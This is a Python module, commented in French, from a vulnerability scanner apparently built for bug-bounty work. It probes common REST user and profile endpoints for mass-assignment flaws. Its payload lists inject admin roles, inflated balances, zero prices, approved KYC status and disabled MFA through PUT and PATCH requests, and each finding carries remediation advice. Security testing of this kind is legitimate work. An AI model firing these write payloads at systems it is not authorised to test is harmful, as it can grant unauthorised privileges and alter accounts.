"""
PhantomScan — Mass Assignment Scanner  v1.0
===========================================
Détecte les vulnérabilités de Mass Assignment (aka Auto-binding, Over-posting)
dans les APIs REST/JSON — l'une des vulnérabilités les plus fréquentes et
rémunératrices en Bug Bounty (OWASP API6:2023).

Principe :
  Les frameworks modernes (Rails, Laravel, Spring, Express, Django REST…)
  peuvent mapper automatiquement les paramètres d'une requête aux attributs
  d'un objet modèle. Si l'application ne filtre pas les champs autorisés,
  un attaquant peut modifier des champs sensibles non exposés dans la
  documentation (rôle, is_admin, balance, verified, plan…).

Vecteurs couverts :
  1. Privilège escalation (is_admin, role, permissions, plan)
  2. Balance/crédit manipulation (balance, credits, amount)
  3. Account verification bypass (email_verified, phone_verified, kyc_status)
  4. Sensitive field override (password, password_hash via API)
  5. Object metadata abuse (created_at, updated_at, id, user_id)
  6. Nested object injection ({ "user": {"role": "admin"} })

Technique de détection :
  - Envoyer une requête PUT/PATCH avec des champs sensibles additionnels
  - Comparer la réponse (200 vs 400/422) et le body retourné
  - Si la réponse 200 inclut le champ injecté → confirmed
  - Si la réponse est 200 sans erreur de validation → probable

Findings émis :
  CRITICAL — is_admin/role/permission injecté et reflété dans la réponse
  HIGH     — champ privilégié accepté sans erreur (400 absent)
  MEDIUM   — champ financier ou de vérification accepté
  LOW      — champ metadata (id, timestamps) accepté
  INFO     — endpoint API avec authentification trouvé (pour test manuel)
"""

from __future__ import annotations

import json
import re
from typing import AsyncIterator, Any
from urllib.parse import urlparse, urljoin

from phantomscan.config import PhantomConfig
from phantomscan.core.requester import Requester, ProbeRequest
from phantomscan.core.heuristic import HeuristicEngine
from phantomscan.output.reporter import Finding, Severity


# ── Champs sensibles à tester, groupés par catégorie ─────────────────────────

PRIVILEGE_FIELDS: list[tuple[str, Any, str]] = [
    # (field_name, injected_value, label)
    ("is_admin",       True,       "admin flag"),
    ("isAdmin",        True,       "admin flag (camelCase)"),
    ("admin",          True,       "admin flag"),
    ("role",           "admin",    "role override"),
    ("roles",          ["admin"],  "roles array"),
    ("permission",     "admin",    "permission"),
    ("permissions",    ["admin"],  "permissions array"),
    ("access_level",   9,          "access level"),
    ("userType",       "admin",    "user type"),
    ("user_type",      "admin",    "user type"),
    ("accountType",    "premium",  "account type"),
    ("account_type",   "premium",  "account type"),
    ("plan",           "enterprise","subscription plan"),
    ("subscription",   "premium",  "subscription"),
    ("tier",           "premium",  "tier"),
    ("group",          "admin",    "group"),
    ("groups",         ["admin"],  "groups array"),
    ("scope",          "admin",    "scope"),
    ("scopes",         ["admin"],  "scopes array"),
]

FINANCIAL_FIELDS: list[tuple[str, Any, str]] = [
    ("balance",        9999999,    "account balance"),
    ("credits",        9999999,    "credits"),
    ("credit",         9999999,    "credit"),
    ("wallet",         9999999,    "wallet balance"),
    ("amount",         9999999,    "amount"),
    ("price",          0,          "price to zero"),
    ("cost",           0,          "cost to zero"),
    ("discount",       100,        "discount percentage"),
]

VERIFICATION_FIELDS: list[tuple[str, Any, str]] = [
    ("email_verified",    True,       "email verification"),
    ("emailVerified",     True,       "email verification"),
    ("phone_verified",    True,       "phone verification"),
    ("is_verified",       True,       "verification flag"),
    ("verified",          True,       "verified flag"),
    ("kyc_status",        "approved", "KYC status"),
    ("kyc_verified",      True,       "KYC verified"),
    ("identity_verified", True,       "identity verified"),
    ("two_factor_enabled",False,      "2FA disabled"),
    ("mfa_enabled",       False,      "MFA disabled"),
]

METADATA_FIELDS: list[tuple[str, Any, str]] = [
    ("id",          999999,                    "object ID"),
    ("user_id",     999999,                    "user ID"),
    ("userId",      999999,                    "user ID (camelCase)"),
    ("owner_id",    999999,                    "owner ID"),
    ("created_at",  "2000-01-01T00:00:00Z",   "creation date"),
    ("updated_at",  "2000-01-01T00:00:00Z",   "update date"),
    ("deleted_at",  None,                      "soft-delete date"),
    ("_id",         "000000000000000000000000","MongoDB ID"),
]

# Endpoints API courants à tester
API_UPDATE_PATHS: list[str] = [
    "/api/v1/user",
    "/api/v1/users/me",
    "/api/v1/profile",
    "/api/v1/account",
    "/api/v2/user",
    "/api/v2/users/me",
    "/api/v2/profile",
    "/api/user",
    "/api/users/me",
    "/api/profile",
    "/api/me",
    "/user",
    "/users/me",
    "/profile",
    "/account",
    "/me",
    "/v1/user",
    "/v1/profile",
    "/v2/user",
    "/v2/profile",
    "/rest/v1/user",
    "/rest/v1/profile",
    "/graphql",  # aussi testé via JSON body
]

# Regex pour détecter la réflexion d'une valeur dans la réponse JSON
_TRUE_RE = re.compile(r'"(?:is_admin|isAdmin|admin|role|roles|permission|permissions|access_level|userType|user_type|plan|tier)"\s*:\s*(?:true|"admin"|"premium"|"enterprise"|9|\["admin"\])', re.I)
_REFLECT_RE_TEMPLATE = r'"{field}"\s*:\s*{value}'


from phantomscan.core.scanner_mixin import ScannerMixin


class MassAssignmentScanner(ScannerMixin):

    def __init__(self, req: Requester, heuristic: HeuristicEngine, cfg: PhantomConfig) -> None:
        self._req = req
        self._heuristic = heuristic
        self._cfg = cfg

    async def run(self, target: str) -> AsyncIterator[Finding]:
        parsed = urlparse(target)
        base = f"{parsed.scheme}://{parsed.netloc}"

        for path in API_UPDATE_PATHS:
            url = base + path
            async for f in self._probe_endpoint(url):
                yield f

    async def _probe_endpoint(self, url: str) -> AsyncIterator[Finding]:
        # v5.20 — Skip via DedupIndex
        if await self.should_skip(url, "PUT", "mass_assignment"):
            return
        # Vérifier que l'endpoint répond (GET d'abord)
        resp_get = await self._req.send(ProbeRequest(
            method="GET",
            url=url,
            headers={"Accept": "application/json"},
        ))
        if resp_get is None:
            return
        if resp_get.status_code not in (200, 401, 403, 404, 405, 422):
            return
        if resp_get.status_code == 404:
            return

        # Si l'endpoint requiert auth (401/403) → note INFO et continue quand même
        # (le scan tourne sous les cookies de l'utilisateur si fournis)
        needs_auth = resp_get.status_code in (401, 403)

        # Tester PUT et PATCH (les deux sont courants)
        for method in ("PUT", "PATCH"):
            async for f in self._test_privilege_fields(url, method, needs_auth):
                yield f
            async for f in self._test_financial_fields(url, method, needs_auth):
                yield f
            async for f in self._test_verification_fields(url, method, needs_auth):
                yield f
            async for f in self._test_metadata_fields(url, method, needs_auth):
                yield f
            async for f in self._test_nested_injection(url, method, needs_auth):
                yield f

    async def _send_json(
        self,
        url: str,
        method: str,
        payload: dict,
    ):
        body = json.dumps(payload).encode()
        return await self._req.send(ProbeRequest(
            method=method,
            url=url,
            headers={"Content-Type": "application/json", "Accept": "application/json"},
            body=body,
        ))

    def _field_reflected(self, resp_body: str, field: str, value: Any) -> bool:
        """Vérifie si le champ et sa valeur sont reflétés dans la réponse JSON."""
        if isinstance(value, bool):
            val_str = "true" if value else "false"
        elif isinstance(value, (int, float)):
            val_str = str(value)
        elif isinstance(value, list):
            val_str = re.escape(json.dumps(value))
        elif value is None:
            val_str = "null"
        else:
            val_str = f'"{re.escape(str(value))}"'

        pattern = re.compile(
            _REFLECT_RE_TEMPLATE.format(field=re.escape(field), value=val_str),
            re.I,
        )
        return bool(pattern.search(resp_body))

    async def _test_privilege_fields(
        self, url: str, method: str, needs_auth: bool
    ) -> AsyncIterator[Finding]:
        for field, value, label in PRIVILEGE_FIELDS:
            payload = {field: value}
            resp = await self._send_json(url, method, payload)
            if resp is None:
                continue

            body_str = (resp.body or b"").decode("utf-8", errors="replace")
            status = resp.status_code

            # 400/422 avec message de validation → probablement protégé
            if status in (400, 422) and len(body_str) > 10:
                continue
            # 401/403 → auth requise, ignorer
            if status in (401, 403):
                continue
            # 200/201/204 sans erreur de validation → suspect
            if status in (200, 201, 204):
                reflected = self._field_reflected(body_str, field, value)
                sev = Severity.CRITICAL if reflected else Severity.HIGH

                yield Finding(
                    title=f"Mass Assignment — Champ privilégié `{field}` accepté ({method})",
                    url=url,
                    severity=sev,
                    description=(
                        f"L'endpoint `{url}` a accepté le champ `{field}: {value!r}` "
                        f"via {method} sans erreur de validation (HTTP {status}).\n\n"
                        + (f"**Le champ est reflété dans la réponse** — exploitation confirmée.\n"
                           if reflected else
                           "Le champ n'est pas visible dans la réponse mais aucune erreur de validation "
                           "n'a été retournée — l'injection est probable.\n")
                        + f"\nPayload envoyé : `{json.dumps(payload)}`\n"
                        f"Réponse (extrait) : {body_str[:300]}"
                    ),
                    param=field,
                    evidence=f"HTTP {status}, reflected={reflected}",
                    remediation=(
                        "1. Utiliser une allowlist des champs acceptés en entrée (Strong Params, DTO).\n"
                        "2. Ne jamais passer directement les données de la requête au modèle ORM.\n"
                        "3. Séparer les objets de transfert (DTO) des objets de domaine.\n"
                        "4. Ajouter des tests d'intégration vérifiant que les champs sensibles "
                        "   provoquent une erreur 400/422."
                    ),
                )
                break  # Un finding de privilege par endpoint suffit

    async def _test_financial_fields(
        self, url: str, method: str, needs_auth: bool
    ) -> AsyncIterator[Finding]:
        for field, value, label in FINANCIAL_FIELDS:
            payload = {field: value}
            resp = await self._send_json(url, method, payload)
            if resp is None:
                continue

            body_str = (resp.body or b"").decode("utf-8", errors="replace")
            status = resp.status_code

            if status in (400, 422, 401, 403):
                continue
            if status in (200, 201, 204):
                reflected = self._field_reflected(body_str, field, value)
                yield Finding(
                    title=f"Mass Assignment — Champ financier `{field}` accepté ({method})",
                    url=url,
                    severity=Severity.MEDIUM if not reflected else Severity.HIGH,
                    description=(
                        f"L'endpoint `{url}` a accepté le champ `{field}: {value!r}` "
                        f"via {method} (HTTP {status}).\n\n"
                        + ("**Champ reflété dans la réponse.**\n" if reflected else "")
                        + f"Payload : `{json.dumps(payload)}`\n"
                        f"Réponse : {body_str[:250]}"
                    ),
                    param=field,
                    evidence=f"HTTP {status}, reflected={reflected}",
                    remediation=(
                        "Ne jamais accepter de champs financiers (balance, price, amount) "
                        "directement depuis le client. Calculer ces valeurs côté serveur."
                    ),
                )
                break

    async def _test_verification_fields(
        self, url: str, method: str, needs_auth: bool
    ) -> AsyncIterator[Finding]:
        for field, value, label in VERIFICATION_FIELDS:
            payload = {field: value}
            resp = await self._send_json(url, method, payload)
            if resp is None:
                continue

            body_str = (resp.body or b"").decode("utf-8", errors="replace")
            status = resp.status_code

            if status in (400, 422, 401, 403):
                continue
            if status in (200, 201, 204):
                reflected = self._field_reflected(body_str, field, value)
                yield Finding(
                    title=f"Mass Assignment — Champ de vérification `{field}` accepté ({method})",
                    url=url,
                    severity=Severity.MEDIUM if not reflected else Severity.HIGH,
                    description=(
                        f"L'endpoint `{url}` a accepté le champ de vérification "
                        f"`{field}: {value!r}` via {method} (HTTP {status}).\n\n"
                        + ("**Champ reflété dans la réponse.**\n" if reflected else "")
                        + f"Payload : `{json.dumps(payload)}`\n"
                        f"Réponse : {body_str[:250]}"
                    ),
                    param=field,
                    evidence=f"HTTP {status}, reflected={reflected}",
                    remediation=(
                        "Les champs de vérification (email_verified, kyc_status…) "
                        "ne doivent être modifiables que par des processus internes "
                        "déclenchés après vérification réelle, jamais par le client."
                    ),
                )
                break

    async def _test_metadata_fields(
        self, url: str, method: str, needs_auth: bool
    ) -> AsyncIterator[Finding]:
        for field, value, label in METADATA_FIELDS:
            payload = {field: value}
            resp = await self._send_json(url, method, payload)
            if resp is None:
                continue

            body_str = (resp.body or b"").decode("utf-8", errors="replace")
            status = resp.status_code

            if status in (400, 422, 401, 403):
                continue
            if status in (200, 201, 204):
                reflected = self._field_reflected(body_str, field, value)
                if reflected:  # Seulement si reflété (sinon trop de bruit)
                    yield Finding(
                        title=f"Mass Assignment — Champ metadata `{field}` modifiable ({method})",
                        url=url,
                        severity=Severity.LOW,
                        description=(
                            f"L'endpoint `{url}` accepte et reflète le champ metadata "
                            f"`{field}: {value!r}` via {method} (HTTP {status}).\n\n"
                            f"Payload : `{json.dumps(payload)}`\n"
                            f"Réponse : {body_str[:250]}"
                        ),
                        param=field,
                        evidence=f"HTTP {status}, reflected=True",
                        remediation=(
                            "Les champs de métadonnées (id, user_id, timestamps) ne doivent "
                            "pas être modifiables par le client. Utiliser des read-only fields "
                            "dans le serializer/DTO."
                        ),
                    )
                    break

    async def _test_nested_injection(
        self, url: str, method: str, needs_auth: bool
    ) -> AsyncIterator[Finding]:
        """
        Teste l'injection dans des objets imbriqués — certains frameworks
        traitent { "user": { "role": "admin" } } différemment de { "role": "admin" }.
        """
        nested_payloads = [
            {"user": {"role": "admin", "is_admin": True}},
            {"account": {"plan": "enterprise", "role": "admin"}},
            {"profile": {"is_admin": True}},
            {"data": {"attributes": {"role": "admin"}}},   # JSON:API format
        ]

        for payload in nested_payloads:
            resp = await self._send_json(url, method, payload)
            if resp is None:
                continue

            body_str = (resp.body or b"").decode("utf-8", errors="replace")
            status = resp.status_code

            if status in (400, 422, 401, 403):
                continue
            if status in (200, 201, 204):
                if _TRUE_RE.search(body_str):
                    yield Finding(
                        title=f"Mass Assignment — Injection imbriquée acceptée ({method})",
                        url=url,
                        severity=Severity.HIGH,
                        description=(
                            f"L'endpoint `{url}` a accepté un payload imbriqué avec des champs "
                            f"privilégiés via {method} (HTTP {status}), et le champ privilégié "
                            f"est reflété dans la réponse.\n\n"
                            f"Payload : `{json.dumps(payload)}`\n"
                            f"Réponse : {body_str[:300]}"
                        ),
                        param="nested object",
                        evidence=body_str[:150],
                        remediation=(
                            "Valider les structures imbriquées avec la même rigueur que les "
                            "champs de premier niveau. Utiliser des DTOs stricts avec allowlists."
                        ),
                    )
                    break
